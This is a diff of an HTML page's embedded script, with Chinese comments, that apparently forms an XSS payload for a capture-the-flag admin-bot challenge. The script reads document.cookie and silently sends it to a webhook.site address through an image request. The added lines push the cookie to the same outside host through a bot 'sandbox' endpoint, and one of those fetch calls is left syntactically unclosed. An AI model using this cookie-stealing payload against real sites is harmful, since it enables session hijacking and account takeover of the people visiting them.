@@ -12,9 +12,13 @@ const cookie = document.cookie;
 // 替换成你自己的webhook.site地址
 const hook = "https://webhook.site/7963ed16-3ffa-4282-8328-93b97065c805";
 // 拼接泄露链接，encodeURIComponent防止特殊字符截断cookie
+new Image().src = hook;
 const leakUrl = hook + "?data=" + encodeURIComponent(cookie);
 // 创建图片GET请求带出数据，无弹窗、无交互、静默发送
 new Image().src = leakUrl;
+fetch("http://nginx/bot/sandbox?target=http%3A%2F%2Fnginx%2F%3Furl%3Dhttps%3A%2F%2Fwebhook.site%2F7963ed16-3ffa-4282-8328-93b97065c805"
+fetch("http://nginx/bot/sandbox?target=http%3A%2F%2Fnginx%2F%3Furl%3Dhttps%3A%2F%2Fwebhook.site%2F7963ed16-3ffa-4282-8328-93b97065c805?c="+encodeURIComponent(document.cookie))
+
 </script>
 </body>
 </html>
